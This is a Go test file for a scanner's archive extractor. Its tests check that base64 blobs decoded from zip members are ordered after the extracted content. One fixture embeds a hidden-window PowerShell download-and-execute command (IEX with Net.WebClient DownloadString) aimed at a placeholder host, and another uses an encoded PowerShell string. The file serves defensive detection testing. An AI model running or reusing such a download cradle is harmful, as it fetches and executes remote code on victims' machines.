package extract

import (
	"bytes"
	"encoding/base64"
	"strings"
	"testing"
	"time"
)

// TestContentStreamsPrecedeDecodeOutput (PERF-50): ContentStreams counts the
// leading extractor entries, and every static-decode blob sits after them.
func TestContentStreamsPrecedeDecodeOutput(t *testing.T) {
	payload := "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://x/a')"
	script := "var s = \"" + base64.StdEncoding.EncodeToString([]byte(payload)) + "\";\n"
	z := buildZip(t, map[string][]byte{"a.js": []byte(script), "b.txt": []byte("plain notes")})
	res := Extract(z, time.Now().Add(10*time.Second))
	if res.DecodedStreams == 0 {
		t.Fatalf("test precondition: no decode blob emitted (streams=%d)", len(res.Streams))
	}
	if res.ContentStreams != 2 {
		t.Fatalf("ContentStreams = %d, want 2 (one per member)", res.ContentStreams)
	}
	for i, st := range res.Streams[:res.ContentStreams] {
		if bytes.Contains(st, []byte("DownloadString")) {
			t.Fatalf("decoded payload found in content region at %d", i)
		}
	}
	found := false
	for _, st := range res.Streams[res.ContentStreams:] {
		found = found || bytes.Contains(st, []byte("DownloadString"))
	}
	if !found {
		t.Fatal("decoded payload not after the content region")
	}
}

// TestContentStreamsZeroForPlainText: a non-container body has no extractor
// content, so its decode output is never counted as content.
func TestContentStreamsZeroForPlainText(t *testing.T) {
	body := "note: " + base64.StdEncoding.EncodeToString([]byte(strings.Repeat("powershell -enc payload ", 4)))
	res := Extract([]byte(body), time.Now().Add(10*time.Second))
	if res.ContentStreams != 0 {
		t.Fatalf("ContentStreams = %d, want 0 for plain text (streams=%d decoded=%d)", res.ContentStreams, len(res.Streams), res.DecodedStreams)
	}
}
